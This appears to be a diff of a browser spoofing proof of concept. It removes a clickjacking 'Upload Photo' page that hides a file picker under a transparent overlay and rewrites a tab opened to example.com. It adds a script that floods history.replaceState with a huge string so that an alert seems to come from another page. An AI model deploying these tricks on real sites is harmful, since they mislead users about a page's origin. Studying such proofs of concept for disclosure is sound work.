@@ -1,91 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-  body { margin:0; font-family:sans-serif; }
-
-  #overlay {
-    position: fixed;
-    inset: 0;
-    background: transparent;
-    cursor: pointer;
-    z-index: 9999;
-  }
-
-  #fileInput {
-    position: absolute;
-    left: -9999px;
-  }
-</style>
-</head>
-
-<body>
-
-<h1>Upload Photo</h1>
-
-<input id="fileInput" type="file" accept="image/*">
-<div id="overlay"></div>
-
 <script>
-const overlay = document.getElementById("overlay");
-const fileInput = document.getElementById("fileInput");
-
-overlay.addEventListener("click", () => {
-  fileInput.click();
-});
-
-fileInput.addEventListener("change", () => {
-  const file = fileInput.files[0];
-  if (!file) return;
-
-  const reader = new FileReader();
-
-  reader.onload = () => {
-    const dataUrl = reader.result;
-
-    // buka example.com di tab baru
-    const newTab = window.open("https://example.com", "_blank");
-
-    // tunggu sebentar lalu replace isi halaman
-    setTimeout(() => {
-      try {
-        newTab.document.open();
-        newTab.document.write(`
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>example.com</title>
-            <style>
-              body {
-                margin:0;
-                background:#0d1117;
-                display:flex;
-                justify-content:center;
-                align-items:center;
-                height:100vh;
-              }
-              img {
-                max-width:100%;
-                max-height:100%;
-              }
-            </style>
-          </head>
-          <body>
-            <img src="${dataUrl}">
-          </body>
-          </html>
-        `);
-        newTab.document.close();
-      } catch (e) {
-        console.log("Blocked by browser:", e);
-      }
-    }, 500);
-  };
-
-  reader.readAsDataURL(file);
-});
+a="aaaaaaaaaaaaaaaa";
+for (i = 0; i < 19; i++) { 
+a += a;
+}
+history.replaceState("example", "example", a);
+alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
 </script>
-
-</body>
-</html>
+The attack page goes here
